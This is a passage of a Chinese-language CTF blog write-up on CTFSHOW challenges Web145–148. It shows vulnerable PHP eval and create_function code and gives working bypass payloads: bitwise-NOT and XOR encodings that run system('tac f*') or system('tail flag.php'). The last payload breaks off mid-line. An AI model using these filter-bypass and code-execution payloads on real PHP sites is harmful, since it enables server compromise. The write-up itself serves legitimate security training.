<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">  <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相较于上一题ban了我们很多运算符，加减乘除都没了<br>但是注意，放出来了？和：和|<br>也就是说可以用三目运算符去写的<br>经过测试<code>eval(&quot;return 1?phpinfo():1;&quot;)</code>是可以执行的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663207035356-4fa5684f-0210-480a-b79f-c6d5e349b557.png#averageHue=%233a424b&clientId=ub7a11f87-29a4-4&from=paste&height=66&id=ue63e4c99&name=image.png&originHeight=82&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4137&status=done&style=none&taskId=u3d3254f6-5201-4d96-9461-b1c8c0923a6&title=&width=281.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663207031359-a25c53c7-7f55-4531-96eb-8f54e8bafedf.png#averageHue=%23dad4ae&clientId=ub7a11f87-29a4-4&from=paste&height=297&id=uf44734a0&name=image.png&originHeight=371&originWidth=1723&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57872&status=done&style=none&taskId=u18ef4800-efe8-4cf2-893d-4e1318cf0a6&title=&width=1378.4" alt="image.png"><br>效仿这么模式构造payload：<br>?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;?(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5):<br>指令是system(‘tac f*’)<br>结束</p>
<h2 id="Web146（145plus）"><a href="#Web146（145plus）" class="headerlink" title="Web146（145plus）"></a>Web146（145plus）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>：被ban了，不能用三目运算符了<br>但是&#x3D;&#x3D;和|没有被ban<br>可以用1&#x3D;&#x3D;phpinfo()||1<br>payload：?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;&#x3D;&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)||</p>
<h2 id="Web147（RCE-命名空间）"><a href="#Web147（RCE-命名空间）" class="headerlink" title="Web147（RCE+命名空间）"></a>Web147（RCE+命名空间）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设计知识盲区了<br>这个正则的意思就是字符必须只能包含字母，数字，下划线，但凡多一个其他的东西就匹配失败<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663210500675-f2fd1df2-cf7d-4b5a-9397-8bd7a27304eb.png#averageHue=%2339424b&clientId=ub7a11f87-29a4-4&from=paste&height=101&id=ue1dc151e&name=image.png&originHeight=126&originWidth=560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12216&status=done&style=none&taskId=uc217a452-1fad-4058-9eb0-e6584b7a922&title=&width=448" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663210559591-d529f036-b7f6-4611-aa58-09404d0da4f2.png#averageHue=%23f6f7f7&clientId=ub7a11f87-29a4-4&from=paste&height=155&id=u8bdeae9b&name=image.png&originHeight=194&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7640&status=done&style=none&taskId=uf0971c1e-85dc-4dcb-b260-9ea27fec54d&title=&width=510.4" alt="image.png"><br>所以还是很好绕过的，在字符串的开头或者结尾加一个特殊字符就可以<br>也就是说我们要找一个加了&#x2F;这类字符还可以使用的函数<br>后来了解到了一个东西：<br><strong>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p>
<p>了解到了这种命名空间调用函数的方法之后又发现了一个函数<code>create_function</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;等价于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个函数等于创造一个函数，但是这是存在漏洞点的，假如我们这样输入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;等价于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663210943323-0e14fa12-ae56-4aad-bf57-3f0f79cfba4c.png#averageHue=%23b6d3b1&clientId=ub7a11f87-29a4-4&from=paste&height=294&id=u8daa78ac&name=image.png&originHeight=368&originWidth=1690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47692&status=done&style=none&taskId=u900da59e-835d-4627-8944-f2db759fd2c&title=&width=1352" alt="image.png"><br>发现这样闭合中括号是可以执行指令的，原理就是闭合中括号，然后注释掉后面的字符‘<br>利用这一点构造payload：<br>post：ctf&#x3D;\create_function<br>get：?show&#x3D;return 1;}system(‘tail flag.php’);&#x2F;&#x2F;<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663211042739-fb72d1b1-eb53-46a0-9256-d0c36071eb4e.png#averageHue=%23e3b972&clientId=ub7a11f87-29a4-4&from=paste&height=153&id=u159e52e3&name=image.png&originHeight=191&originWidth=1832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29616&status=done&style=none&taskId=u884246c2-e153-4233-82e3-03a4bb1ec65&title=&width=1465.6" alt="image.png"><br>结束</p>
<h2 id="Web148（中文变量-异或）"><a href="#Web148（中文变量-异或）" class="headerlink" title="Web148（中文变量+异或）"></a>Web148（中文变量+异或）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没ban异或符号<br>解法一：<br>使用异或构造get_ctfshow_fl0g();<br>payload：?code&#x3D;(“%07%05%09%01%03%09%06%08%08%0f%08%01%06%0c%0b%07”^”%60%60%7d%5e%60%7d%60%7b%60%60%7f%5e%60%60%3b%60”)();<br>之后访问源代码即可获得答案</p>
<p>解法二：<br>使用中文变量,可以看到是没把$和；ban掉的<br>payload:<br>?code&#x3D;$哈&#x3D;”&#96;</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/Docker%20Learning/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Docker学习</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/CTFSHOW-SQL%E6%B3%A8%E5%85%A5/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">CTFSHOW-SQL注入</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>